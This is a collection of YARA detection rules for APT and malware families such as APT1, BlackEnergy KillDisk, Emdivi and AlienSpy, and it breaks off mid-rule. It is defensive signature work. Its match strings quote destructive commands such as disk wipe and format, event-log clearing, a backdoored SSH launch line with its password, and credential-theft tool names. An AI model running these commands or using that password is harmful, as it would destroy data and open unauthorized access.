        info = "CommentCrew-threat-apt1"

    strings:
        $1 = "\\pipe\\ssnp" wide ascii
        $2 = "toobu.ini" wide ascii
        $3 = "Serverfile is not bigger than Clientfile" wide ascii
        $4 = "URL download success" wide ascii
    condition:
        3 of them
}

rule APT1_TARSIP_MOON
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

    strings:
        $s1 = "\\XiaoME\\SunCloud-Code\\moon" wide ascii
        $s2 = "URL download success!" wide ascii
        $s3 = "Kugoosoft" wide ascii
        $msg1 = "Modify file failed!! So strange!" wide ascii
        $msg2 = "Create cmd process failed!" wide ascii
        $msg3 = "The command has not been implemented!" wide ascii
        $msg4 = "Runas success!" wide ascii
        $onec1 = "onec.php" wide ascii
        $onec2 = "/bin/onec" wide ascii
    condition:
        1 of ($s*) and 1 of ($msg*) and 1 of ($onec*)
}

// 20150909 - Issue #39 - Commented because of High FP rate
/*
rule APT1_payloads
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

    strings:
        $pay1 = "rusinfo.exe" wide ascii
        $pay2 = "cmd.exe" wide ascii
        $pay3 = "AdobeUpdater.exe" wide ascii
        $pay4 = "buildout.exe" wide ascii
        $pay5 = "DefWatch.exe" wide ascii
        $pay6 = "d.exe" wide ascii
        $pay7 = "em.exe" wide ascii
        $pay8 = "IMSCMig.exe" wide ascii
        $pay9 = "localfile.exe" wide ascii
        $pay10 = "md.exe" wide ascii
        $pay11 = "mdm.exe" wide ascii
        $pay12 = "mimikatz.exe" wide ascii
        $pay13 = "msdev.exe" wide ascii
        $pay14 = "ntoskrnl.exe" wide ascii
        $pay15 = "p.exe" wide ascii
        $pay16 = "otepad.exe" wide ascii
        $pay17 = "reg.exe" wide ascii
        $pay18 = "regsvr.exe" wide ascii
        $pay19 = "runinfo.exe" wide ascii
        $pay20 = "AdobeUpdate.exe" wide ascii
        $pay21 = "inetinfo.exe" wide ascii
        $pay22 = "svehost.exe" wide ascii
        $pay23 = "update.exe" wide ascii
        $pay24 = "NTLMHash.exe" wide ascii
        $pay25 = "wpnpinst.exe" wide ascii
        $pay26 = "WSDbg.exe" wide ascii
        $pay27 = "xcmd.exe" wide ascii
        $pay28 = "adobeup.exe" wide ascii
        $pay29 = "0830.bin" wide ascii
        $pay30 = "1001.bin" wide ascii
        $pay31 = "a.bin" wide ascii
        $pay32 = "ISUN32.EXE" wide ascii
        $pay33 = "AcroRD32.EXE" wide ascii
        $pay34 = "INETINFO.EXE" wide ascii
    condition:
        1 of them
}
*/

rule APT1_malware_rarSilent_EXE_PDF
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

    strings:
        $winmalware_rar1 = "WINmalware_rar.SFX" wide ascii
        /*
        $winmalware_rar2 = ";The comment below contains SFX script commands" wide ascii
        $winmalware_rar3 = "Silent=1" wide ascii
	*/

        /*$str1 = /Setup=[\s\w\"]+\.(exe|pdf|doc)/
	*/
        $str2 = "Steup=\"" wide ascii
    condition:
        all of ($winmalware_rar*) and 1 of ($str*)
}

rule APT1_aspnetreport
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

    strings:
        $url = "aspnet_client/report.asp" wide ascii
        $param = "name=%s&Gender=%c&Random=%04d&SessionKey=%s" wide ascii
        $pay1 = "rusinfo.exe" wide ascii
        $pay2 = "cmd.exe" wide ascii
        $pay3 = "AdobeUpdater.exe" wide ascii
        $pay4 = "buildout.exe" wide ascii
        $pay5 = "DefWatch.exe" wide ascii
        $pay6 = "d.exe" wide ascii
        $pay7 = "em.exe" wide ascii
        $pay8 = "IMSCMig.exe" wide ascii
        $pay9 = "localfile.exe" wide ascii
        $pay10 = "md.exe" wide ascii
        $pay11 = "mdm.exe" wide ascii
        $pay12 = "mimikatz.exe" wide ascii
        $pay13 = "msdev.exe" wide ascii
        $pay14 = "ntoskrnl.exe" wide ascii
        $pay15 = "p.exe" wide ascii
        $pay16 = "otepad.exe" wide ascii
        $pay17 = "reg.exe" wide ascii
        $pay18 = "regsvr.exe" wide ascii
        $pay19 = "runinfo.exe" wide ascii
        $pay20 = "AdobeUpdate.exe" wide ascii
        $pay21 = "inetinfo.exe" wide ascii
        $pay22 = "svehost.exe" wide ascii
        $pay23 = "update.exe" wide ascii
        $pay24 = "NTLMHash.exe" wide ascii
        $pay25 = "wpnpinst.exe" wide ascii
        $pay26 = "WSDbg.exe" wide ascii
        $pay27 = "xcmd.exe" wide ascii
        $pay28 = "adobeup.exe" wide ascii
        $pay29 = "0830.bin" wide ascii
        $pay30 = "1001.bin" wide ascii
        $pay31 = "a.bin" wide ascii
        $pay32 = "ISUN32.EXE" wide ascii
        $pay33 = "AcroRD32.EXE" wide ascii
        $pay34 = "INETINFO.EXE" wide ascii
    condition:
        $url and $param and 1 of ($pay*)
}

rule APT1_Revird_svc
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

    strings:
        $dll1 = "nwwwks.dll" wide ascii
        $dll2 = "rdisk.dll" wide ascii
        $dll3 = "skeys.dll" wide ascii
        $dll4 = "SvcHost.DLL.log" wide ascii
        $svc1 = "InstallService" wide ascii
        $svc2 = "RundllInstallA" wide ascii
        $svc3 = "RundllUninstallA" wide ascii
        $svc4 = "ServiceMain" wide ascii
        $svc5 = "UninstallService" wide ascii
    condition:
        1 of ($dll*) and 2 of ($svc*)
}

rule APT1_dbg_mess
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

    strings:
        $dbg1 = "Down file ok!" wide ascii
        $dbg2 = "Send file ok!" wide ascii
        $dbg3 = "Command Error!" wide ascii
        $dbg4 = "Pls choose target first!" wide ascii
        $dbg5 = "Alert!" wide ascii
        $dbg6 = "Pls press enter to make sure!" wide ascii
        $dbg7 = "Are you sure to " wide ascii
        $pay1 = "rusinfo.exe" wide ascii
        $pay2 = "cmd.exe" wide ascii
        $pay3 = "AdobeUpdater.exe" wide ascii
        $pay4 = "buildout.exe" wide ascii
        $pay5 = "DefWatch.exe" wide ascii
        $pay6 = "d.exe" wide ascii
        $pay7 = "em.exe" wide ascii
        $pay8 = "IMSCMig.exe" wide ascii
        $pay9 = "localfile.exe" wide ascii
        $pay10 = "md.exe" wide ascii
        $pay11 = "mdm.exe" wide ascii
        $pay12 = "mimikatz.exe" wide ascii
        $pay13 = "msdev.exe" wide ascii
        $pay14 = "ntoskrnl.exe" wide ascii
        $pay15 = "p.exe" wide ascii
        $pay16 = "otepad.exe" wide ascii
        $pay17 = "reg.exe" wide ascii
        $pay18 = "regsvr.exe" wide ascii
        $pay19 = "runinfo.exe" wide ascii
        $pay20 = "AdobeUpdate.exe" wide ascii
        $pay21 = "inetinfo.exe" wide ascii
        $pay22 = "svehost.exe" wide ascii
        $pay23 = "update.exe" wide ascii
        $pay24 = "NTLMHash.exe" wide ascii
        $pay25 = "wpnpinst.exe" wide ascii
        $pay26 = "WSDbg.exe" wide ascii
        $pay27 = "xcmd.exe" wide ascii
        $pay28 = "adobeup.exe" wide ascii
        $pay29 = "0830.bin" wide ascii
        $pay30 = "1001.bin" wide ascii
        $pay31 = "a.bin" wide ascii
        $pay32 = "ISUN32.EXE" wide ascii
        $pay33 = "AcroRD32.EXE" wide ascii
        $pay34 = "INETINFO.EXE" wide ascii        
    condition:
        4 of ($dbg*) and 1 of ($pay*)
}

rule APT1_known_malicious_malware_rarSilent
{
    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"

    strings:
        $str1 = "Analysis And Outlook.doc\"" wide ascii
        $str2 = "North Korean launch.pdf\"" wide ascii
        $str3 = "Dollar General.doc\"" wide ascii
        $str4 = "Dow Corning Corp.pdf\"" wide ascii
    condition:
        1 of them and APT1_malware_rarSilent_EXE_PDF
}


/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule APT3102Code : APT3102 Family 
{
    meta:
        description = "3102 code features"
        author = "Seth Hardy"
        last_modified = "2014-06-25"
        
    strings:
        $setupthread = { B9 02 07 00 00 BE ?? ?? ?? ?? 8B F8 6A 00 F3 A5 }
  
    condition:
        any of them
}

rule APT3102Strings : APT3102 Family
{
    meta:
        description = "3102 Identifying Strings"
        author = "Seth Hardy"
        last_modified = "2014-06-25"
        
    strings:
        $ = "rundll32_exec.dll\x00Update"
        // this is in the encrypted code - shares with 9002 variant
        //$ = "POST http://%ls:%d/%x HTTP/1.1"
        
    condition:
       any of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule APT9002Code : APT9002 Family 
{
    meta:
        description = "9002 code features"
        author = "Seth Hardy"
        last_modified = "2014-06-25"
        
    strings:
        // start code block
        $ = { B9 7A 21 00 00 BE ?? ?? ?? ?? 8B F8 ?? ?? ?? F3 A5 }
        // decryption from other variant with multiple start threads
        $ = { 8A 14 3E 8A 1C 01 32 DA 88 1C 01 8B 54 3E 04 40 3B C2 72 EC }
  
    condition:
        any of them
}

rule APT9002Strings : APT9002 Family
{
    meta:
        description = "9002 Identifying Strings"
        author = "Seth Hardy"
        last_modified = "2014-06-25"
        
    strings:
        $ = "POST http://%ls:%d/%x HTTP/1.1"
        $ = "%%TEMP%%\\%s_p.ax" wide ascii
        $ = "%TEMP%\\uid.ax" wide ascii
        $ = "%%TEMP%%\\%s.ax" wide ascii
        // also triggers on surtr $ = "mydll.dll\x00DoWork"
        $ = "sysinfo\x00sysbin01"
        $ = "\\FlashUpdate.exe"
        
    condition:
       any of them
}

rule APT9002 : Family
{
    meta:
        description = "9002"
        author = "Seth Hardy"
        last_modified = "2014-06-25"
        
    condition:
        APT9002Code or APT9002Strings
}

rule FE_APT_9002 : RAT
{
    meta:
        Author      = "FireEye Labs"
        Date        = "2013/11/10"
        Description = "Strings inside"
        Reference   = "Useful link"

    strings:
        $mz = { 4d 5a }
        $a = "rat_UnInstall" wide ascii

    condition:
        ($mz at 0) and $a
}

/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as long as you use it under this license.
*/

rule crime_win_rat_AlienSpy
{
meta:
	description = "Alien Spy Remote Access Trojan"
	author = "General Dynamics Fidelis Cybersecurity Solutions - Threat Research Team"
	reference_1 = "www.fidelissecurity.com/sites/default/files/FTA_1015_Alienspy_FINAL.pdf"
	reference_2 = "www.fidelissecurity.com/sites/default/files/AlienSpy-Configs2_1_2.csv"
	date = "2015-04-04"
	filetype = "Java"
	hash_1 = "075fa0567d3415fbab3514b8aa64cfcb"
	hash_2 = "818afea3040a887f191ee9d0579ac6ed"
	hash_3 = "973de705f2f01e82c00db92eaa27912c"
	hash_4 = "7f838907f9cc8305544bd0ad4cfd278e"
	hash_5 = "071e12454731161d47a12a8c4b3adfea"
	hash_6 = "a7d50760d49faff3656903c1130fd20b"
	hash_7 = "f399afb901fcdf436a1b2a135da3ee39"
	hash_8 = "3698a3630f80a632c0c7c12e929184fb"
	hash_9 = "fdb674cadfa038ff9d931e376f89f1b6"

   strings:
		
        $sa_1 = "META-INF/MANIFEST.MF"
        $sa_2 = "Main.classPK"
        $sa_3 = "plugins/Server.classPK"
        $sa_4 = "IDPK"
		
        $sb_1 = "config.iniPK"
        $sb_2 = "password.iniPK"
        $sb_3 = "plugins/Server.classPK"
        $sb_4 = "LoadStub.classPK"
        $sb_5 = "LoadStubDecrypted.classPK"
        $sb_7 = "LoadPassword.classPK"
        $sb_8 = "DecryptStub.classPK"
        $sb_9 = "ClassLoaders.classPK"
		
        $sc_1 = "config.xml"
        $sc_2 = "options"
        $sc_3 = "plugins"
        $sc_4 = "util"
        $sc_5 = "util/OSHelper"
        $sc_6 = "Start.class"
        $sc_7 = "AlienSpy"
        $sc_8 = "PK"
	
  condition:
    
	uint16(0) == 0x4B50 and filesize < 800KB and ( (all of ($sa_*)) or (all of ($sb_*)) or (all of ($sc_*)) )
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as long as you use it under this license.
*/

rule APT17_Sample_FXSST_DLL {
	meta:
		description = "Detects Samples related to APT17 activity - file FXSST.DLL"
		author = "Florian Roth"
		reference = "https://goo.gl/ZiJyQv"
		date = "2015-05-14"
		hash = "52f1add5ad28dc30f68afda5d41b354533d8bce3"
	strings:
		$x1 = "Microsoft? Windows? Operating System" fullword wide
		$x2 = "fxsst.dll" fullword ascii
		
		$y1 = "DllRegisterServer" fullword ascii
		$y2 = ".cSV" fullword ascii
		
		$s1 = "GetLastActivePopup"
		$s2 = "Sleep"
		$s3 = "GetModuleFileName"
		$s4 = "VirtualProtect"
		$s5 = "HeapAlloc"
		$s6 = "GetProcessHeap"
		$s7 = "GetCommandLine"
	condition:
		uint16(0) == 0x5a4d and filesize < 800KB and 
			( 1 of ($x*) or all of ($y*) ) and all of ($s*)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as long as you use it under this license.
*/

rule apt_backspace{
	meta:
		description = "Detects APT backspace"
		author = "Bit Byte Bitten"
		date = "2015-05-14"
		hash = "6cbfeb7526de65eb2e3c848acac05da1e885636d17c1c45c62ad37e44cd84f99"
	strings:
		$s1 = "!! Use Splice Socket !!"
		$s2 = "User-Agent: SJZJ (compatible; MSIE 6.0; Win32)"
		$s3 = "g_nAV=%d,hWnd:0x%X,className:%s,Title:%s,(%d,%d,%d,%d),BOOL=%d"
	condition:
		uint16(0) == 0x5a4d and all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-02-19
	Identifier: BlackEnergy Malware
*/

rule BlackEnergy_BE_2 {
   meta:
      description = "Detects BlackEnergy 2 Malware"
      author = "Florian Roth"
      reference = "http://goo.gl/DThzLz"
      date = "2015/02/19"
      hash = "983cfcf3aaaeff1ad82eb70f77088ad6ccedee77"
   strings:
      $s0 = "<description> Windows system utility service  </description>" fullword ascii
      $s1 = "WindowsSysUtility - Unicode" fullword wide
      $s2 = "msiexec.exe" fullword wide
      $s3 = "WinHelpW" fullword ascii
      $s4 = "ReadProcessMemory" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 250KB and all of ($s*)
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-01-03
	Identifier: BlackEnergy Malware
*/

rule BlackEnergy_VBS_Agent {
	meta:
		description = "Detects VBS Agent from BlackEnergy Report - file Dropbearrun.vbs"
		author = "Florian Roth"
		reference = "http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/"
		date = "2016-01-03"
		hash = "b90f268b5e7f70af1687d9825c09df15908ad3a6978b328dc88f96143a64af0f"
	strings:
		$s0 = "WshShell.Run \"dropbear.exe -r rsa -d dss -a -p 6789\", 0, false" fullword ascii
		$s1 = "WshShell.CurrentDirectory = \"C:\\WINDOWS\\TEMP\\Dropbear\\\"" fullword ascii
		$s2 = "Set WshShell = CreateObject(\"WScript.Shell\")" fullword ascii /* Goodware String - occured 1 times */
	condition:
		filesize < 1KB and 2 of them
}

rule DropBear_SSH_Server {
	meta:
		description = "Detects DropBear SSH Server (not a threat but used to maintain access)"
		author = "Florian Roth"
		reference = "http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/"
		date = "2016-01-03"
		score = 50
		hash = "0969daac4adc84ab7b50d4f9ffb16c4e1a07c6dbfc968bd6649497c794a161cd"
	strings:
		$s1 = "Dropbear server v%s https://matt.ucc.asn.au/dropbear/dropbear.html" fullword ascii
		$s2 = "Badly formatted command= authorized_keys option" fullword ascii
		$s3 = "This Dropbear program does not support '%s' %s algorithm" fullword ascii
		$s4 = "/etc/dropbear/dropbear_dss_host_key" fullword ascii
		$s5 = "/etc/dropbear/dropbear_rsa_host_key" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and 2 of them
}

rule BlackEnergy_BackdoorPass_DropBear_SSH {
	meta:
		description = "Detects the password of the backdoored DropBear SSH Server - BlackEnergy"
		author = "Florian Roth"
		reference = "http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/"
		date = "2016-01-03"
		hash = "0969daac4adc84ab7b50d4f9ffb16c4e1a07c6dbfc968bd6649497c794a161cd"
	strings:
		$s1 = "passDs5Bu9Te7" fullword ascii
	condition:
		uint16(0) == 0x5a4d and $s1
}

/* Super Rules ------------------------------------------------------------- */

rule BlackEnergy_KillDisk_1 {
	meta:
		description = "Detects KillDisk malware from BlackEnergy"
		author = "Florian Roth"
		reference = "http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/"
		date = "2016-01-03"
		score = 80
		super_rule = 1
		hash1 = "11b7b8a7965b52ebb213b023b6772dd2c76c66893fc96a18a9a33c8cf125af80"
		hash2 = "5d2b1abc7c35de73375dd54a4ec5f0b060ca80a1831dac46ad411b4fe4eac4c6"
		hash3 = "c7536ab90621311b526aefd56003ef8e1166168f038307ae960346ce8f75203d"
		hash4 = "f52869474834be5a6b5df7f8f0c46cbc7e9b22fa5cb30bee0f363ec6eb056b95"
	strings:
		$s0 = "system32\\cmd.exe" fullword ascii
		$s1 = "system32\\icacls.exe" fullword wide
		$s2 = "/c del /F /S /Q %c:\\*.*" fullword ascii
		$s3 = "shutdown /r /t %d" fullword ascii
		$s4 = "/C /Q /grant " fullword wide
		$s5 = "%08X.tmp" fullword ascii
		$s6 = "/c format %c: /Y /X /FS:NTFS" fullword ascii
		$s7 = "/c format %c: /Y /Q" fullword ascii
		$s8 = "taskhost.exe" fullword wide /* Goodware String - occured 1 times */
		$s9 = "shutdown.exe" fullword wide /* Goodware String - occured 1 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 500KB and 8 of them
}

rule BlackEnergy_KillDisk_2 {
	meta:
		description = "Detects KillDisk malware from BlackEnergy"
		author = "Florian Roth"
		reference = "http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/"
		date = "2016-01-03"
		score = 80
		super_rule = 1
		hash1 = "11b7b8a7965b52ebb213b023b6772dd2c76c66893fc96a18a9a33c8cf125af80"
		hash2 = "5d2b1abc7c35de73375dd54a4ec5f0b060ca80a1831dac46ad411b4fe4eac4c6"
		hash3 = "f52869474834be5a6b5df7f8f0c46cbc7e9b22fa5cb30bee0f363ec6eb056b95"
	strings:
		$s0 = "%c:\\~tmp%08X.tmp" fullword ascii
		$s1 = "%s%08X.tmp" fullword ascii
		$s2 = ".exe.sys.drv.doc.docx.xls.xlsx.mdb.ppt.pptx.xml.jpg.jpeg.ini.inf.ttf" fullword wide
		$s3 = "%ls_%ls_%ls_%d.~tmp" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 500KB and 3 of them
}

rule BlackEnergy_Driver_USBMDM {
	meta:
		description = "Auto-generated rule - from files 7874a10e551377d50264da5906dc07ec31b173dee18867f88ea556ad70d8f094, b73777469f939c331cbc1c9ad703f973d55851f3ad09282ab5b3546befa5b54a, edb16d3ccd50fc8f0f77d0875bf50a629fa38e5ba1b8eeefd54468df97eba281"
		author = "Florian Roth"
		reference = "http://www.welivesecurity.com/2016/01/03/blackenergy-sshbeardoor-details-2015-attacks-ukrainian-news-media-electric-industry/"
		date = "2016-01-04"
		super_rule = 1
		hash1 = "7874a10e551377d50264da5906dc07ec31b173dee18867f88ea556ad70d8f094"
		hash2 = "b73777469f939c331cbc1c9ad703f973d55851f3ad09282ab5b3546befa5b54a"
		hash3 = "edb16d3ccd50fc8f0f77d0875bf50a629fa38e5ba1b8eeefd54468df97eba281"
		hash4 = "ac13b819379855af80ea3499e7fb645f1c96a4a6709792613917df4276c583fc"
		hash5 = "7a393b3eadfc8938cbecf84ca630e56e37d8b3d23e084a12ea5a7955642db291"
		hash6 = "405013e66b6f137f915738e5623228f36c74e362873310c5f2634ca2fda6fbc5"
		hash7 = "244dd8018177ea5a92c70a7be94334fa457c1aab8a1c1ea51580d7da500c3ad5"
		hash8 = "edcd1722fdc2c924382903b7e4580f9b77603110e497393c9947d45d311234bf"
	strings:
		$s1 = "USB MDM Driver" fullword wide
		$s2 = "KdDebuggerNotPresent" fullword ascii /* Goodware String - occured 50 times */
		$s3 = "KdDebuggerEnabled" fullword ascii /* Goodware String - occured 69 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 180KB and all of them
}

rule BlackEnergy_Driver_AMDIDE {
	meta:
		description = "Auto-generated rule - from files 32d3121135a835c3347b553b70f3c4c68eef711af02c161f007a9fbaffe7e614, 3432db9cb1fb9daa2f2ac554a0a006be96040d2a7776a072a8db051d064a8be2, 90ba78b6710462c2d97815e8745679942b3b296135490f0095bdc0cd97a34d9c, 97be6b2cec90f655ef11ed9feef5b9ef057fd8db7dd11712ddb3702ed7c7bda1"
		author = "Florian Roth"
		reference = "http://www.welivesecurity.com/2016/01/03/blackenergy-sshbeardoor-details-2015-attacks-ukrainian-news-media-electric-industry/"
		date = "2016-01-04"
		super_rule = 1
		hash1 = "32d3121135a835c3347b553b70f3c4c68eef711af02c161f007a9fbaffe7e614"
		hash2 = "3432db9cb1fb9daa2f2ac554a0a006be96040d2a7776a072a8db051d064a8be2"
		hash3 = "90ba78b6710462c2d97815e8745679942b3b296135490f0095bdc0cd97a34d9c"
		hash4 = "97be6b2cec90f655ef11ed9feef5b9ef057fd8db7dd11712ddb3702ed7c7bda1"
		hash5 = "5111de45210751c8e40441f16760bf59856ba798ba99e3c9532a104752bf7bcc"
		hash6 = "cbc4b0aaa30b967a6e29df452c5d7c2a16577cede54d6d705ca1f095bd6d4988"
		hash7 = "1ce0dfe1a6663756a32c69f7494ad082d293d32fe656d7908fb445283ab5fa68"
	strings:
		$s1 = " AMD IDE driver" fullword wide
		$s2 = "SessionEnv" fullword wide
		$s3 = "\\DosDevices\\{C9059FFF-1C49-4445-83E8-" wide
		$s4 = "\\Device\\{C9059FFF-1C49-4445-83E8-" wide
	condition:
		uint16(0) == 0x5a4d and filesize < 150KB and all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

rule Emdivi_SFX {
	meta:
		description = "Detects Emdivi malware in SFX Archive"
		author = "Florian Roth @Cyber0ps"
		reference = "https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/"
		date = "2015-08-20"
		score = 70
		hash1 = "7a3c81b2b3c14b9cd913692347019887b607c54152b348d6d3ccd3ecfd406196"
		hash2 = "8c3df4e4549db3ce57fc1f7b1b2dfeedb7ba079f654861ca0b608cbfa1df0f6b"
	strings:
		$x1 = "Setup=unsecess.exe" fullword ascii
		$x2 = "Setup=leassnp.exe" fullword ascii

		$s1 = "&Enter password for the encrypted file:" fullword wide
		$s2 = ";The comment below contains SFX script commands" fullword ascii
		$s3 = "Path=%temp%" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 740KB and (1 of ($x*) and all of ($s*))
}

/* Super Rules ------------------------------------------------------------- */

rule Emdivi_Gen1 {
	meta:
		description = "Detects Emdivi Malware"
		author = "Florian Roth @Cyber0ps"
		reference = "https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/"
		date = "2015-08-20"
		score = 80
		super_rule = 1
		hash1 = "17e646ca2558a65ffe7aa185ba75d5c3a573c041b897355c2721e9a8ca5fee24"
		hash2 = "3553c136b4eba70eec5d80abe44bd7c7c33ab1b65de617dbb7be5025c9cf01f1"
		hash3 = "6a331c4e654dd8ddaa2c69d260aa5f4f76f243df8b5019d62d4db5ae5c965662"
		hash4 = "90d07ea2bb80ed52b007f57d0d9a79430cd50174825c43d5746a16ee4f94ea86"
	strings:
		$x1 = "wmic nteventlog where filename=\"SecEvent\" call cleareventlog" fullword wide
		$s0 = "del %Temp%\\*.exe %Temp%\\*.dll %Temp%\\*.bat %Temp%\\*.ps1 %Temp%\\*.cmd /f /q" fullword wide
		$s3 = "userControl-v80.exe" fullword ascii

		$s1 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727.42)" fullword wide
		$s2 = "http://www.msftncsi.com" fullword wide
		$s3 = "net use | find /i \"c$\"" fullword wide
		$s4 = " /del /y & " fullword wide
		$s5 = "\\auto.cfg" fullword wide
		$s6 = "/ncsi.txt" fullword wide
		$s7 = "Dcmd /c" fullword wide
		$s8 = "/PROXY" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 800KB and all of them
}

rule Emdivi_Gen2 {
	meta:
		description = "Detects Emdivi Malware"
		author = "Florian Roth @Cyber0ps"
		reference = "https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/"
		date = "2015-08-20"
		super_rule = 1
		score = 80
		hash1 = "9a351885bf5f6fec466f30021088504d96e9db10309622ed198184294717add1"
		hash2 = "a5be7cb1f37030c9f9211c71e0fbe01dae19ff0e6560c5aab393621f18a7d012"
		hash3 = "9183abb9b639699cd2ad28d375febe1f34c14679b7638d1a79edb49d920524a4"
	strings:
		$s1 = "%TEMP%\\IELogs\\" fullword ascii
		$s2 = "MSPUB.EXE" fullword ascii
		$s3 = "%temp%\\" fullword ascii
		$s4 = "\\NOTEPAD.EXE" fullword ascii
		$s5 = "%4d-%02d-%02d %02d:%02d:%02d " fullword ascii
		$s6 = "INTERNET_OPEN_TYPE_PRECONFIG" fullword ascii
		$s7 = "%4d%02d%02d%02d%02d%02d" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1300KB and 6 of them
}

rule Emdivi_Gen3 {
	meta:
		description = "Detects Emdivi Malware"
		author = "Florian Roth @Cyber0ps"
		reference = "https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/"
		date = "2015-08-20"
		super_rule = 1
		score = 80
		hash1 = "008f4f14cf64dc9d323b6cb5942da4a99979c4c7d750ec1228d8c8285883771e"
		hash2 = "a94bf485cebeda8e4b74bbe2c0a0567903a13c36b9bf60fab484a9b55207fe0d"
	strings:
		$x1 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727.42)" fullword ascii

		$s2 = "\\Mozilla\\Firefox\\Profiles\\" fullword ascii
		$s4 = "\\auto.cfg" fullword ascii
		$s5 = "/ncsi.txt" fullword ascii
		$s6 = "/en-us/default.aspx" fullword ascii
		$s7 = "cmd /c" fullword ascii	
		$s9 = "APPDATA" fullword ascii /* Goodware String - occured 25 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 850KB and 
		(
			( $x1 and 1 of ($s*) ) or 
			( 4 of ($s*) )
		)
}

rule Emdivi_Gen4 {
	meta:
		description = "Detects Emdivi Malware"
		author = "Florian Roth @Cyber0ps"
		reference = "https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/"
		date = "2015-08-20"
		super_rule = 1
		score = 80
		hash1 = "008f4f14cf64dc9d323b6cb5942da4a99979c4c7d750ec1228d8c8285883771e"
		hash2 = "17e646ca2558a65ffe7aa185ba75d5c3a573c041b897355c2721e9a8ca5fee24"
		hash3 = "3553c136b4eba70eec5d80abe44bd7c7c33ab1b65de617dbb7be5025c9cf01f1"
		hash4 = "6a331c4e654dd8ddaa2c69d260aa5f4f76f243df8b5019d62d4db5ae5c965662"
		hash5 = "90d07ea2bb80ed52b007f57d0d9a79430cd50174825c43d5746a16ee4f94ea86"
		hash6 = "a94bf485cebeda8e4b74bbe2c0a0567903a13c36b9bf60fab484a9b55207fe0d"
	strings:
		$s1 = ".http_port\", " fullword wide
		$s2 = "UserAgent: " fullword ascii
		$s3 = "AUTH FAILED" fullword ascii
		$s4 = "INVALID FILE PATH" fullword ascii
		$s5 = ".autoconfig_url\", \"" fullword wide
		$s6 = "FAILED TO WRITE FILE" fullword ascii
		$s7 = ".proxy" fullword wide
		$s8 = "AuthType: " fullword ascii
		$s9 = ".no_proxies_on\", \"" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 853KB and all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as long as you use it under this license.
*/

import "pe"

rule apt_c16_win_memory_pcclient 
{
  meta:
    author = "@dragonthreatlab"
    md5 = "ec532bbe9d0882d403473102e9724557"
    description = "File matching the md5 above tends to only live in memory, hence the lack of MZ header check."
    date        = "2015/01/11" 
    reference   = "http://blog.dragonthreatlabs.com/2015/01/dtl-12012015-01-hong-kong-swc-attack.html"
  strings:
    $str1 = "Kill You" ascii
    $str2 = "%4d-%02d-%02d %02d:%02d:%02d" ascii
    $str3 = "%4.2f  KB" ascii
    $encodefunc = {8A 08 32 CA 02 CA 88 08 40 4E 75 F4}  
  condition:
    all of them
}

rule apt_c16_win_disk_pcclient 
{
  meta:
    author = "@dragonthreatlab"
    md5 = "55f84d88d84c221437cd23cdbc541d2e"
    description = "Encoded version of pcclient found on disk"
    date        = "2015/01/11" 
    reference   = "http://blog.dragonthreatlabs.com/2015/01/dtl-12012015-01-hong-kong-swc-attack.html"
  strings:
